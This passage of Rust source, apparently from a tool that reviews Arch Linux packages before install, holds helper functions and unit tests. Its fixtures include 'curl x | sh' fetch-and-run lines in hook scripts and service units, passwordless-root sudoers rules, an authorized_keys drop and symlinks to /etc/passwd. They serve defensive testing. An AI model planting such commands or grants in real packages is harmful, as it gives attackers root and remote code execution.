    let namers: Vec<String> = run_by.iter().take(3).map(|namer| shown(namer)).collect();
    let header = format!(
        "# /{path} is a file of this package named in {}{}, which may run or read it.\n",
        namers.join(", "),
        if run_by.len() > namers.len() {
            " and others"
        } else {
            ""
        }
    );
    PayloadFile {
        content: annotated(content, &header),
        path,
        run_by,
        leads_outside: None,
        shipped,
    }
}

/// How a file that names another is called in a sentence.
fn shown(namer: &str) -> String {
    if namer == ".INSTALL" {
        "the install scriptlet".to_string()
    } else {
        format!("/{namer}")
    }
}

/// Each auto-run entry as a payload file: its own content, or a link's
/// resolved content (or a note that the package does not ship it).
fn payload_files(sources: &[Source<'_>], read: &HashMap<String, Vec<u8>>) -> Vec<PayloadFile> {
    sources
        .iter()
        .map(|(entry, source)| {
            let (content, shipped) = match (&entry.kind, source) {
                (Kind::Symlink(target), Resolution::Regular(resolved)) => {
                    let bytes = read.get(resolved).map_or(&[][..], Vec::as_slice);
                    let header = format!(
                        "# {} is a symbolic link to {target}, whose content follows.\n",
                        entry.path
                    );
                    (
                        annotated(content::classify_payload(resolved, bytes), &header),
                        Shipped::Link {
                            target: target.clone(),
                            content: Some(bytes.to_vec()),
                        },
                    )
                }
                (Kind::Symlink(target), Resolution::Outside(resolved)) => (
                    Content::Text(format!(
                        "# {} is a symbolic link to {target} ({resolved}), which this package does not ship.\n",
                        entry.path
                    )),
                    Shipped::Link {
                        target: target.clone(),
                        content: None,
                    },
                ),
                (_, Resolution::Regular(path)) => {
                    let bytes = read.get(path).cloned().unwrap_or_default();
                    (
                        content::classify_payload(&entry.path, &bytes),
                        Shipped::Bytes(bytes),
                    )
                }
                (_, Resolution::Outside(_)) => (Content::Undecodable, Shipped::Unknown),
            };
            PayloadFile {
                path: entry.path.clone(),
                content,
                run_by: Vec::new(),
                leads_outside: match (&entry.kind, source) {
                    (Kind::Symlink(_), Resolution::Outside(resolved)) => Some(resolved.clone()),
                    _ => None,
                },
                shipped,
            }
        })
        .collect()
}

/// `content` with `header` before its text.
pub fn annotated(content: Content, header: &str) -> Content {
    match content {
        Content::Text(text) => Content::Text(format!("{header}{text}")),
        Content::Lossy { text, replaced } => Content::Lossy {
            text: format!("{header}{text}"),
            replaced,
        },
        other => other,
    }
}

#[cfg(test)]
mod tests {
    use std::fs;
    use std::os::unix::fs::symlink;
    use std::path::Path;
    use std::process::Command;

    use super::{
        Archive, Entry, Kind, Resolution, lexical_target, parse_model, protected_violation, review,
        root_set_id, unescape,
    };
    use crate::config::model::SourceClass;
    use crate::content::Content;
    use crate::test_support::{TempDir, tool_available};

    #[test]
    fn names_are_unescaped_and_control_characters_refused() {
        assert_eq!(
            unescape(r"system-systemd\\x2dcryptsetup.slice").as_deref(),
            Some(r"system-systemd\x2dcryptsetup.slice")
        );
        assert_eq!(unescape(r"caf\303\251").as_deref(), Some("café"));
        assert_eq!(unescape(r"nl\nx"), None);
        assert_eq!(unescape(r"x\351"), None);
        assert_eq!(unescape(r"bad\q"), None);
    }

    #[test]
    fn files_installed_setuid_or_setgid_root_are_told_apart() {
        assert_eq!(root_set_id("-rwsr-xr-x", "0", "0"), Some("setuid root"));
        assert_eq!(root_set_id("-rwSr--r--", "0", "100"), Some("setuid root"));
        assert_eq!(root_set_id("-rwxr-sr-x", "0", "0"), Some("setgid root"));
        // To another user or group, or not set at all.
        assert_eq!(
            root_set_id("-rwsr-xr-x", "1000", "0"),
            Some(super::SETUID_OTHER)
        );
        assert_eq!(
            root_set_id("-rwxr-sr-x", "0", "5"),
            Some(super::SETGID_OTHER)
        );
        assert_eq!(root_set_id("-rwxr-xr-x", "0", "0"), None);
        assert_eq!(root_set_id("-rwxr-xr-t", "0", "0"), None);
        let open = super::open_to_others;
        assert_eq!(
            open("-rwxrwxrwx", "0", "0", "usr/bin/tool"),
            Some(super::WRITABLE_BY_ALL)
        );
        assert_eq!(open("-rwxrwxr-x", "0", "0", "usr/bin/tool"), None);
        assert_eq!(open("-rw-rw-rw-", "0", "0", "var/lib/x/state"), None);
        // A directory anyone, its owner or its group may write into.
        assert_eq!(
            open(
                "drwxrwxrwx",
                "0",
                "0",
                "usr/lib/systemd/system/sshd.service.d"
            ),
            Some(super::WRITABLE_BY_ALL)
        );
        assert_eq!(open("drwxrwxrwt", "0", "0", "opt/app/tmp"), None);
        assert_eq!(
            open("-rwxr-xr-x", "1000", "0", "usr/bin/tool"),
            Some(super::OWNED_BY_OTHER)
        );
        assert_eq!(
            open("-rw-rw-r--", "0", "983", "etc/app.conf"),
            Some(super::WRITABLE_BY_GROUP)
        );
        assert_eq!(open("-rw-r-----", "0", "983", "etc/app.conf"), None);

        let names = ".PKGINFO\nusr/bin/x\nusr/bin/dir/\n";
        let details = [
            detail('-', 10, ".PKGINFO"),
            "-rwsr-xr-x  0 0      0           9 Sep 30 22:51 usr/bin/x".to_string(),
            "drwsr-sr-x  0 0      0           0 Sep 30 22:51 usr/bin/dir/".to_string(),
        ]
        .join("\n");
        let model = parse_model(names, &details).unwrap();
        let set: Vec<Option<&str>> = model.iter().map(|entry| entry.root_set_id).collect();
        assert_eq!(set, [None, Some("setuid root"), None]);
    }

    fn detail(kind: char, size: u64, rest: &str) -> String {
        format!("{kind}rw-r--r--  0 1000   1000   {size:>6} Sep 30 22:51 {rest}")
    }

    #[test]
    fn the_model_zips_both_listings_with_any_owner_and_link_names() {
        let names = ".PKGINFO\netc/\netc/sudoers.d/a -> b\netc/sudoers.d/l\netc/sudoers.d/h\n";
        let details = [
            detail('-', 10, ".PKGINFO"),
            detail('d', 0, "etc/"),
            detail('-', 2, "etc/sudoers.d/a -> b"),
            detail('l', 0, "etc/sudoers.d/l -> ../x"),
            detail('h', 0, "etc/sudoers.d/h link to etc/sudoers.d/a -> b"),
        ]
        .join("\n");
        let model = parse_model(names, &details).unwrap();
        assert_eq!(
            model[2],
            Entry {
                path: "etc/sudoers.d/a -> b".into(),
                size: 2,
                kind: Kind::File,
                // Owned by uid 1000, under `/etc`.
                root_set_id: Some(super::OWNED_BY_OTHER)
            }
        );
        assert_eq!(model[3].kind, Kind::Symlink("../x".into()));
        assert_eq!(model[4].kind, Kind::HardLink("etc/sudoers.d/a -> b".into()));
        assert_eq!(model[1].path, "etc");
    }

    #[test]
    fn the_model_refuses_what_libalpm_would_install_elsewhere() {
        let refused = |name: &str, kind: char| {
            parse_model(&format!("{name}\n"), &detail(kind, 1, name)).is_err()
        };
        for name in [
            "etc//sudoers.d/x",
            "etc/./sudoers.d/x",
            "/etc/sudoers.d/x",
            "usr/../etc/x",
            ".hidden",
            "./etc/x",
        ] {
            assert!(refused(name, '-'), "{name}");
        }
        // Metadata must be a regular file, and nothing may appear twice.
        assert!(refused(".INSTALL", 'l'));
        let twice = parse_model(
            ".INSTALL\n.INSTALL\n",
            &[detail('-', 1, ".INSTALL"), detail('-', 1, ".INSTALL")].join("\n"),
        );
        assert!(twice.is_err());
        // Hard links must name an earlier regular entry.
        assert!(parse_model("etc/x\n", &detail('h', 0, "etc/x link to etc/y")).is_err());
        // Entries under a symbolic-link directory, mismatched listings and
        // unknown types.
        assert!(
            parse_model(
                "etc/d\netc/d/x\n",
                &[detail('l', 0, "etc/d -> /etc"), detail('-', 1, "etc/d/x")].join("\n")
            )
            .is_err()
        );
        assert!(parse_model("a\nb\n", &detail('-', 1, "a")).is_err());
        assert!(parse_model("dev\n", &detail('c', 0, "dev")).is_err());
    }

    #[test]
    fn protected_paths_need_their_owner() {
        let official = SourceClass::Official;
        let local = SourceClass::LocalPackage;
        assert!(
            protected_violation("etc/omarchy-guardian/config.toml", "evil", local, &[]).is_some()
        );
        assert!(
            protected_violation("etc/omarchy-guardian/config.toml", "evil", official, &[])
                .is_some()
        );
        assert!(protected_violation("usr/bin/opencode", "opencode", official, &[]).is_none());
        assert!(
            protected_violation(
                "usr/bin/opencode",
                "opencode",
                SourceClass::ThirdPartyRepo,
                &[]
            )
            .is_some()
        );
        assert!(
            protected_violation(
                "usr/bin/opencode",
                "opencode-bin",
                SourceClass::ThirdPartyRepo,
                &["opencode-bin".into()]
            )
            .is_none()
        );
        assert!(protected_violation("usr/local/bin/claude", "anything", local, &[]).is_some());
        assert!(
            protected_violation("usr/lib/omarchy-guardian/x", "omarchy-guardian", local, &[])
                .is_none()
        );
        assert!(
            protected_violation(
                "usr/bin/bsdtar",
                "libarchive-git",
                SourceClass::ThirdPartyRepo,
                &[]
            )
            .is_some()
        );
        assert!(protected_violation("usr/bin/foo", "anything", local, &[]).is_none());
        // A permit or an allow list a package shipped would be root's file
        // like the real ones: no package ships one, Guardian's included.
        for package in ["evil", "omarchy-guardian"] {
            for path in [
                "var/lib/omarchy-guardian/permits/1000-pacman-abc",
                "var/lib/omarchy-guardian/sweep/allowed.json",
                "var/lib/omarchy-guardian",
            ] {
                assert!(
                    protected_violation(path, package, official, &[]).is_some(),
                    "{package} {path}"
                );
            }
        }
        // The audit trail's tools are the official packages' alone.
        for tool in ["usr/bin/logger", "usr/bin/journalctl"] {
            assert!(protected_violation(tool, "evil", local, &[]).is_some());
            assert!(protected_violation(tool, "util-linux", official, &[]).is_none());
        }
        // The gate itself comes from the user's own build or an official
        // repository, not from whichever repository offers that name.
        for path in [
            "usr/bin/omarchy-guardian",
            "usr/lib/omarchy-guardian/guardian-pacman-hook",
            "usr/share/omarchy-guardian/omarchy-guardian.hook",
        ] {
            assert!(protected_violation(path, "omarchy-guardian", local, &[]).is_none());
            assert!(protected_violation(path, "omarchy-guardian", official, &[]).is_none());
            assert!(
                protected_violation(path, "omarchy-guardian", SourceClass::ThirdPartyRepo, &[])
                    .is_some(),
                "{path}"
            );
        }
    }

    fn build(root: &Path, archive: &Path, members: &[&str], extra: &[&str]) {
        let status = Command::new("/usr/bin/bsdtar")
            .arg("-cf")
            .arg(archive)
            .args(extra)
            .args(members)
            .current_dir(root)
            .status()
            .unwrap();
        assert!(status.success());
    }

    #[test]
    fn reviews_the_scriptlet_auto_run_files_links_and_executed_scripts() {
        if !tool_available("/usr/bin/bsdtar") {
            return;
        }
        let dir = TempDir::new("payload");
        let root = dir.path().join("root");
        let units = root.join("usr/lib/systemd/system");
        fs::create_dir_all(units.join("multi-user.target.wants")).unwrap();
        fs::create_dir_all(root.join("etc/sudoers.d")).unwrap();
        fs::create_dir_all(root.join("usr/share/libalpm/hooks")).unwrap();
        fs::create_dir_all(root.join("usr/share/x")).unwrap();
        fs::write(root.join(".PKGINFO"), "pkgname = x\npkgver = 1-1\n").unwrap();
        fs::write(root.join(".INSTALL"), "post_install() { echo hi; }\n").unwrap();
        fs::write(units.join("x.service"), "[Service]\nExecStart=/usr/bin/x\n").unwrap();
        symlink(
            "../x.service",
            units.join("multi-user.target.wants/x.service"),
        )
        .unwrap();
        fs::write(
            root.join("etc/sudoers.d/x"),
            b"x ALL=(ALL) NOPASSWD: ALL # caf\xe9\n",
        )
        .unwrap();
        fs::write(
            root.join("usr/share/libalpm/hooks/x.hook"),
            "[Action]\nExec = /usr/share/x/run.sh\n",
        )
        .unwrap();
        fs::write(root.join("usr/share/x/run.sh"), "#!/bin/sh\ncurl x | sh\n").unwrap();
        let archive = dir.path().join("x-1-1-any.pkg.tar");
        build(
            &root,
            &archive,
            &[".PKGINFO", ".INSTALL", "usr", "etc"],
            &[],
        );

        let opened = Archive::open(&archive).unwrap();
        let reviewed = review(&opened, "x", SourceClass::LocalPackage, &[]).unwrap();
        assert_eq!(
            reviewed.install,
            Some(Content::Text("post_install() { echo hi; }\n".into()))
        );
        let paths: Vec<&str> = reviewed
            .files
            .iter()
            .map(|file| file.path.as_str())
            .collect();
        assert_eq!(
            paths,
            [
                "etc/sudoers.d/x",
                "usr/lib/systemd/system/multi-user.target.wants/x.service",
                "usr/share/libalpm/hooks/x.hook",
                "usr/share/x/run.sh",
            ]
        );
        assert!(
            matches!(&reviewed.files[0].content, Content::Lossy { text, .. } if text.contains("NOPASSWD"))
        );
        let Content::Text(unit) = &reviewed.files[1].content else {
            panic!()
        };
        assert!(unit.contains("ExecStart=/usr/bin/x"), "{unit}");
        let Content::Text(run) = &reviewed.files[3].content else {
            panic!()
        };
        assert!(
            run.contains("named in /usr/share/libalpm/hooks/x.hook") && run.contains("curl x | sh")
        );
        assert_eq!(reviewed.files[3].run_by, ["usr/share/libalpm/hooks/x.hook"]);
        opened.verify_unchanged().unwrap();

        // The declared name must be the transaction target.
        assert!(review(&opened, "y", SourceClass::LocalPackage, &[]).is_err());

        // Installed copies that match are recognised; a changed one is not.
        let installed = dir.path().join("installed");
        fs::create_dir_all(installed.join("etc/sudoers.d")).unwrap();
        fs::write(
            installed.join("etc/sudoers.d/x"),
            b"x ALL=(ALL) NOPASSWD: ALL # caf\xe9\n",
        )
        .unwrap();
        assert!(reviewed.files[0].is_installed_unchanged(&installed));
        fs::write(installed.join("etc/sudoers.d/x"), "x ALL=(ALL) ALL\n").unwrap();
        assert!(!reviewed.files[0].is_installed_unchanged(&installed));
    }

    #[test]
    fn an_enabling_link_is_unchanged_only_while_its_unit_is() {
        if !tool_available("/usr/bin/bsdtar") {
            return;
        }
        let dir = TempDir::new("payload-enabled");
        let unit = "usr/lib/systemd/system/x.service";
        let link = "usr/lib/systemd/system/multi-user.target.wants/x.service";
        // The same tree is the package and, with another unit, the system.
        let lay_out = |name: &str, exec: &str| {
            let root = dir.path().join(name);
            fs::create_dir_all(root.join(link).parent().unwrap()).unwrap();
            fs::write(root.join(".PKGINFO"), "pkgname = x\n").unwrap();
            fs::write(root.join(unit), format!("[Service]\nExecStart={exec}\n")).unwrap();
            symlink("../x.service", root.join(link)).unwrap();
            root
        };
        let root = lay_out("package", "/usr/bin/sh -c 'curl x | sh'");
        let archive = dir.path().join("x-2-1-any.pkg.tar");
        build(&root, &archive, &[".PKGINFO", "usr"], &[]);
        let opened = Archive::open(&archive).unwrap();
        let reviewed = review(&opened, "x", SourceClass::LocalPackage, &[]).unwrap();
        let enabled = &reviewed.files[0];
        assert_eq!(enabled.path, link);

        // The link is the same; what it enables is not.
        let before = lay_out("before", "/usr/bin/x");
        assert!(!enabled.is_installed_unchanged(&before));
        assert!(enabled.is_installed_unchanged(&root));
    }

    #[test]
    fn a_link_standing_in_for_an_auto_run_directory_is_refused() {
        if !tool_available("/usr/bin/bsdtar") {
            return;
        }
        assert_eq!(
            lexical_target("etc/xdg/systemd/user", "../../systemd/user").as_deref(),
            Some("etc/systemd/user")
        );
        assert_eq!(
            lexical_target("etc/cron.d", "/usr/share/x").as_deref(),
            Some("usr/share/x")
        );
        assert_eq!(lexical_target("etc/cron.d", "../../x"), None);
        // `lib` is a link on the system: the text says etc/cron.d, the
        // system goes to usr/etc/cron.d.
        assert_eq!(lexical_target("etc/cron.d", "../lib/../etc/cron.d"), None);
        assert_eq!(lexical_target("etc/cron.d", "/etc/x/../cron.d"), None);
        for (name, link, target) in [
            ("sleep", "etc/systemd/system-sleep", "/usr/share/x/run"),
            ("cron", "etc/cron.d", "/usr/share/x/run"),
            (
                "wants",
                "usr/lib/systemd/system/multi-user.target.wants",
                "/usr/share/x/run",
            ),
            // Through a name that may be a link, to files of another kind,
            // below a catalogued directory, or a unit directory in /etc.
            ("climb", "etc/cron.d", "../lib/../etc/cron.daily"),
            ("kind", "etc/sudoers.d", "../usr/local/bin"),
            ("below", "etc/xdg/systemd/user", "../../systemd/user/sub"),
            (
                "etc-wants",
                "etc/systemd/system/multi-user.target.wants",
                "/tmp",
            ),
        ] {
            let dir = TempDir::new(&format!("payload-dirlink-{name}"));
            let root = dir.path().join("root");
            fs::create_dir_all(root.join("usr/share/x/run")).unwrap();
            fs::create_dir_all(root.join(link).parent().unwrap()).unwrap();
            fs::write(root.join(".PKGINFO"), "pkgname = x\n").unwrap();
            fs::write(root.join("usr/share/x/run/job"), "#!/bin/sh\ncurl x | sh\n").unwrap();
            symlink(target, root.join(link)).unwrap();
            let archive = dir.path().join("x-1-1-any.pkg.tar");
            let members: Vec<&str> = [".PKGINFO", "etc", "usr"]
                .into_iter()
                .filter(|member| root.join(member).exists())
                .collect();
            build(&root, &archive, &members, &[]);
            let opened = Archive::open(&archive).unwrap();
            let error = review(&opened, "x", SourceClass::LocalPackage, &[])
                .err()
                .unwrap();
            assert!(
                error.to_string().contains("standing in for a directory"),
                "{name}: {error}"
            );
        }
    }

    #[test]
    fn a_link_to_another_auto_run_directory_is_systemds_own_layout() {
        if !tool_available("/usr/bin/bsdtar") {
            return;
        }
        let dir = TempDir::new("payload-dirlink-systemd");
        let root = dir.path().join("root");
        fs::create_dir_all(root.join("etc/xdg/systemd")).unwrap();
        fs::create_dir_all(root.join("etc/systemd/user")).unwrap();
        fs::write(root.join(".PKGINFO"), "pkgname = systemd\n").unwrap();
        fs::write(
            root.join("etc/systemd/user/x.service"),
            "[Service]\nExecStart=/usr/bin/x\n",
        )
        .unwrap();
        symlink("../../systemd/user", root.join("etc/xdg/systemd/user")).unwrap();
        let archive = dir.path().join("systemd-1-1-any.pkg.tar");
        build(&root, &archive, &[".PKGINFO", "etc"], &[]);
        let opened = Archive::open(&archive).unwrap();
        let reviewed = review(&opened, "systemd", SourceClass::Official, &[]).unwrap();
        let paths: Vec<&str> = reviewed
            .files
            .iter()
            .map(|file| file.path.as_str())
            .collect();
        assert_eq!(paths, ["etc/systemd/user/x.service"]);
    }

    #[test]
    fn links_out_of_the_package_or_through_links_are_notes_or_refusals() {
        if !tool_available("/usr/bin/bsdtar") {
            return;
        }
        let dir = TempDir::new("payload-links");
        let root = dir.path().join("root");
        fs::create_dir_all(root.join("etc/sudoers.d")).unwrap();
        fs::write(root.join(".PKGINFO"), "pkgname = x\n").unwrap();
        symlink(
            "/usr/lib/systemd/system/other.service",
            root.join("etc/sudoers.d/out"),
        )
        .unwrap();
        let archive = dir.path().join("x-1-1-any.pkg.tar");
        build(&root, &archive, &[".PKGINFO", "etc"], &[]);
        let opened = Archive::open(&archive).unwrap();
        assert_eq!(
            opened.resolve("etc/sudoers.d/out", "/usr/lib/systemd/system/other.service"),
            Ok(Resolution::Outside(
                "/usr/lib/systemd/system/other.service".into()
            ))
        );
        let reviewed = review(&opened, "x", SourceClass::LocalPackage, &[]).unwrap();
        assert!(
            matches!(&reviewed.files[0].content, Content::Text(text) if text.contains("does not ship"))
        );

        // Through `/lib` (a link to `usr/lib` on the system) the file the
        // package ships there is what the link leads to, `..` included.
        let root = dir.path().join("root3");
        fs::create_dir_all(root.join("etc/sudoers.d")).unwrap();
        fs::create_dir_all(root.join("usr/lib/pkg")).unwrap();
        fs::create_dir_all(root.join("usr/share")).unwrap();
        fs::write(root.join(".PKGINFO"), "pkgname = x\n").unwrap();
        fs::write(
            root.join("usr/lib/pkg/data"),
            "ALL ALL=(ALL) NOPASSWD: ALL\n",
        )
        .unwrap();
        fs::write(root.join("usr/share/rule"), "x\n").unwrap();
        let archive = dir.path().join("x3-1-1-any.pkg.tar");
        build(&root, &archive, &[".PKGINFO", "etc", "usr"], &[]);
        let opened = Archive::open(&archive).unwrap();
        for (target, leads) in [
            ("/lib/pkg/data", "usr/lib/pkg/data"),
            ("/lib64/pkg/data", "usr/lib/pkg/data"),
            ("/lib/../share/rule", "usr/share/rule"),
            ("../../lib/pkg/data", "usr/lib/pkg/data"),
        ] {
            assert_eq!(
                opened.resolve("etc/sudoers.d/x", target),
                Ok(Resolution::Regular(leads.into())),
                "{target}"
            );
        }

        // d -> /etc and e -> d/passwd: through a link, refused, host never read.
        let root = dir.path().join("root2");
        fs::create_dir_all(root.join("etc/sudoers.d")).unwrap();
        fs::write(root.join(".PKGINFO"), "pkgname = x\n").unwrap();
        symlink("/etc", root.join("etc/sudoers.d/d")).unwrap();
        symlink("d/passwd", root.join("etc/sudoers.d/e")).unwrap();
        let archive = dir.path().join("x2-1-1-any.pkg.tar");
        build(&root, &archive, &[".PKGINFO", "etc"], &[]);
        let opened = Archive::open(&archive).unwrap();
        assert!(review(&opened, "x", SourceClass::LocalPackage, &[]).is_err());
    }

    #[test]
    fn a_space_in_the_owner_name_does_not_hide_a_sudoers_file() {
        if !tool_available("/usr/bin/bsdtar") {
            return;
        }
        let dir = TempDir::new("payload-owner");
        let root = dir.path().join("root");
        fs::create_dir_all(root.join("etc/sudoers.d")).unwrap();
        fs::write(root.join(".PKGINFO"), "pkgname = x\n").unwrap();
        fs::write(
            root.join("etc/sudoers.d/x"),
            "ALL ALL=(ALL) NOPASSWD: ALL\n",
        )
        .unwrap();
        let archive = dir.path().join("x-1-1-any.pkg.tar");
        build(
            &root,
            &archive,
            &[".PKGINFO", "etc"],
            &["--uname", "a b", "--gname", "c d"],
        );
        let opened = Archive::open(&archive).unwrap();
        let reviewed = review(&opened, "x", SourceClass::LocalPackage, &[]).unwrap();
        assert_eq!(reviewed.files.len(), 1);
        assert!(
            matches!(&reviewed.files[0].content, Content::Text(text) if text.contains("NOPASSWD"))
        );
    }

    #[test]
    fn a_protected_path_from_the_wrong_package_is_refused() {
        if !tool_available("/usr/bin/bsdtar") {
            return;
        }
        let dir = TempDir::new("payload-protected");
        let root = dir.path().join("root");
        fs::create_dir_all(root.join("etc/omarchy-guardian")).unwrap();
        fs::write(root.join(".PKGINFO"), "pkgname = x\n").unwrap();
        fs::write(
            root.join("etc/omarchy-guardian/config.toml"),
            "profile = \"local-only\"\n",
        )
        .unwrap();
        let archive = dir.path().join("x-1-1-any.pkg.tar");
        build(&root, &archive, &[".PKGINFO", "etc"], &[]);
        let opened = Archive::open(&archive).unwrap();
        let error = review(&opened, "x", SourceClass::Official, &[])
            .err()
            .unwrap();
        assert!(error.to_string().contains("disarm Guardian"), "{error}");
    }

    /// Misplaced files, a root link, a claim on Guardian's place, and the
    /// newer auto-run places.
    #[test]
    fn what_a_package_grants_or_misplaces_is_seen_without_a_scriptlet() {
        if !tool_available("/usr/bin/bsdtar") {
            return;
        }
        let dir = TempDir::new("payload-grants");
        let as_root = ["--uid", "0", "--gid", "0"];
        let package = |name: &str, info: &str, files: &[(&str, &str)]| {
            let root = dir.path().join(name);
            fs::create_dir_all(&root).unwrap();
            fs::write(root.join(".PKGINFO"), format!("pkgname = {name}\n{info}")).unwrap();
            let mut members = vec![".PKGINFO".to_string()];
            for (path, text) in files {
                fs::create_dir_all(root.join(path).parent().unwrap()).unwrap();
                fs::write(root.join(path), text).unwrap();
                let top = path.split('/').next().unwrap().to_string();
                if !members.contains(&top) {
                    members.push(top);
                }
            }
            (root, members)
        };
        let open = |root: &Path, members: &[String], name: &str| {
            let archive = dir.path().join(format!("{name}-1-1-any.pkg.tar"));
            let members: Vec<&str> = members.iter().map(String::as_str).collect();
            build(root, &archive, &members, &as_root);
            Archive::open(&archive).unwrap()
        };
        let refused = |archive: &Archive, name: &str| {
            review(archive, name, SourceClass::ThirdPartyRepo, &[])
                .err()
                .map(|error| error.to_string())
                .unwrap_or_default()
        };

        for (name, path, expected) in [
            (
                "a",
                "run/systemd/system-generators/x",
                "where no package's files belong",
            ),
            (
                "b",
                "root/.ssh/authorized_keys",
                "where no package's files belong",
            ),
            ("c", "lib/modules/x", "is a link to a directory in /usr"),
            ("c2", "usr/sbin/x", "is a link to a directory in /usr"),
            (
                "c3",
                "usr/lib64/libx.so",
                "is a link to a directory in /usr",
            ),
        ] {
            let (root, members) = package(name, "", &[(path, "x\n")]);
            let error = refused(&open(&root, &members, name), name);
            assert!(error.contains(expected), "{path}: {error}");
        }

        let (root, members) = package(
            "d",
            "replaces = omarchy-guardian\n",
            &[("usr/bin/d", "x\n")],
        );
        let error = refused(&open(&root, &members, "d"), "d");
        assert!(error.contains("remove or stand in for Guardian"), "{error}");
        let (root, members) = package(
            "e",
            "",
            &[
                ("etc/systemd/system.control/x.service", "[Service]\n"),
                ("usr/lib/initcpio/post/x", "#!/bin/sh\n"),
                ("usr/lib/python3.13/site-packages/x.pth", "import os\n"),
                ("etc/logrotate.d/x", "/var/log/x {}\n"),
            ],
        );
        let reviewed = review(
            &open(&root, &members, "e"),
            "e",
            SourceClass::ThirdPartyRepo,
            &[],
        )
        .unwrap();
        let paths: Vec<&str> = reviewed
            .files
            .iter()
            .map(|file| file.path.as_str())
            .collect();
        assert_eq!(paths.len(), 4, "{paths:?}");
    }

    #[test]
    fn a_directory_anyone_may_write_into_is_a_grant() {
        use std::os::unix::fs::PermissionsExt;
        if !tool_available("/usr/bin/bsdtar") {
            return;
        }
        let dir = TempDir::new("payload-open-directory");
        let root = dir.path().join("root");
        let drop_ins = root.join("usr/lib/systemd/system/x.service.d");
        fs::create_dir_all(&drop_ins).unwrap();
        fs::write(root.join(".PKGINFO"), "pkgname = f\n").unwrap();
        fs::write(drop_ins.join("a.conf"), "[Service]\n").unwrap();
        fs::set_permissions(&drop_ins, fs::Permissions::from_mode(0o777)).unwrap();
        let archive = dir.path().join("f-1-1-any.pkg.tar");
        build(
            &root,
            &archive,
            &[".PKGINFO", "usr"],
            &["--uid", "0", "--gid", "0"],
        );
        let reviewed = review(
            &Archive::open(&archive).unwrap(),
            "f",
            SourceClass::ThirdPartyRepo,
            &[],
        )
        .unwrap();
        assert!(
            reviewed.root_set_id.contains(&(
                "usr/lib/systemd/system/x.service.d".to_string(),
                super::WRITABLE_BY_ALL
            )),
            "{:?}",
            reviewed.root_set_id
        );
    }

    #[test]
    fn capabilities_and_access_lists_are_read_from_the_archive_headers() {
        fn block(name: &str, kind: u8, data: &[u8]) -> Vec<u8> {
            let mut header = vec![0_u8; 512];
            header[..name.len()].copy_from_slice(name.as_bytes());
            let size = format!("{:011o}", data.len());
            header[124..135].copy_from_slice(size.as_bytes());
            header[156] = kind;
            let mut out = header;
            out.extend_from_slice(data);
            out.resize(out.len().div_ceil(512) * 512, 0);
            out
        }
        fn record(key: &str, value: &str) -> String {
            let body = format!(" {key}={value}\n");
            let mut length = body.len() + 1;
            while format!("{length}{body}").len() != length {
                length = format!("{length}{body}").len();
            }
            format!("{length}{body}")
        }
        let mut tar = Vec::new();
        tar.extend(block("usr/bin/plain", b'0', b"x\n"));
        tar.extend(block(
            "PaxHeader/capped",
            b'x',
            (record("LIBARCHIVE.xattr.security.capability", "AQAAAoAAAAA=")
                + &record("SCHILY.xattr.security.capability", "\u{1}"))
                .as_bytes(),
        ));
        tar.extend(block("usr/bin/capped", b'0', b"x\n"));
        tar.extend(block(
            "PaxHeader/long",
            b'x',
            (record("path", "usr/share/a/long/name") + &record("SCHILY.acl.access", "user::rwx"))
                .as_bytes(),
        ));
        tar.extend(block("short", b'0', b""));
        tar.extend(block("usr/bin/after", b'0', b"y\n"));
        tar.extend(vec![0_u8; 1024]);
        assert_eq!(
            super::attributes_in_tar(tar.as_slice()).unwrap(),
            [
                (
                    "usr/bin/capped".to_string(),
                    super::WITH_CAPABILITIES,
                    Some("AQAAAoAAAAA=".to_string())
                ),
                ("usr/share/a/long/name".to_string(), super::WITH_ACL, None)
            ]
        );
        // A stream that ends inside an entry is refused, not half read.
        let cut = &tar[..700];
        assert!(super::attributes_in_tar(cut).is_err());
    }

    /// A package archive `name` (owned by root) with `info` after its name
    /// in `.PKGINFO`, an optional scriptlet, and `files`.
    fn pack(
        dir: &Path,
        name: &str,
        info: &str,
        install: Option<&str>,
        files: &[(&str, &[u8])],
    ) -> std::path::PathBuf {
        let root = dir.join(format!("{name}-root"));
        fs::create_dir_all(&root).unwrap();
        fs::write(root.join(".PKGINFO"), format!("pkgname = {name}\n{info}")).unwrap();
        let mut members = vec![".PKGINFO".to_string()];
        if let Some(script) = install {
            fs::write(root.join(".INSTALL"), script).unwrap();
            members.push(".INSTALL".into());
        }
        for (path, bytes) in files {
            fs::create_dir_all(root.join(path).parent().unwrap()).unwrap();
            fs::write(root.join(path), bytes).unwrap();
            let top = path.split('/').next().unwrap().to_string();
            if !members.contains(&top) {
                members.push(top);
            }
        }
        let archive = dir.join(format!("{name}-1-1-any.pkg.tar"));
        let members: Vec<&str> = members.iter().map(String::as_str).collect();
        build(&root, &archive, &members, &["--uid", "0", "--gid", "0"]);
        archive
    }

    const ELF: &[u8] = b"\x7fELF\x02\x01\x01\0\0\0\0\0\0\0\0\0\x03\0\x3e\0";

    #[test]
    fn a_package_named_like_guardian_or_its_reviewer_needs_the_right_origin() {
        use super::name_violation;
        let third = SourceClass::ThirdPartyRepo;
        let local = SourceClass::LocalPackage;
        let official = SourceClass::Official;
        assert!(name_violation("omarchy-guardian", third, &[]).is_some());
        assert!(name_violation("omarchy-guardian", local, &[]).is_none());
        assert!(name_violation("omarchy-guardian", official, &[]).is_none());
        for reviewer in ["opencode", "claude-code"] {
            assert!(name_violation(reviewer, third, &[]).is_some(), "{reviewer}");
            assert!(name_violation(reviewer, local, &[]).is_some(), "{reviewer}");
            assert!(
                name_violation(reviewer, official, &[]).is_none(),
                "{reviewer}"
            );
            // The system configuration may trust that name from elsewhere.
            assert!(name_violation(reviewer, local, &[reviewer.to_string()]).is_none());
        }
        assert!(name_violation("opencode-bin", third, &[]).is_none());
        assert!(name_violation("anything", third, &[]).is_none());
    }

    #[test]
    fn nobody_claims_guardians_place_and_only_an_owner_its_reviewers() {
        use super::claim_violation;
        let third = SourceClass::ThirdPartyRepo;
        let claims = |info: &str, package: &str, class, trusted: &[String]| {
            claim_violation(info, package, class, trusted).map(|(_, what)| what)
        };
        for key in ["replaces", "conflict", "provides"] {
            assert_eq!(
                claims(&format!("{key} = omarchy-guardian>=1\n"), "x", third, &[]),
                Some("Guardian"),
                "{key}"
            );
            // Not even an official package.
            assert_eq!(
                claims(
                    &format!("{key} = omarchy-guardian\n"),
                    "x",
                    SourceClass::Official,
                    &[]
                ),
                Some("Guardian")
            );
            for reviewer in ["opencode", "claude-code"] {
                let info = format!("pkgver = 1\n{key} = {reviewer}=2\n");
                assert_eq!(
                    claims(&info, "x", third, &[]),
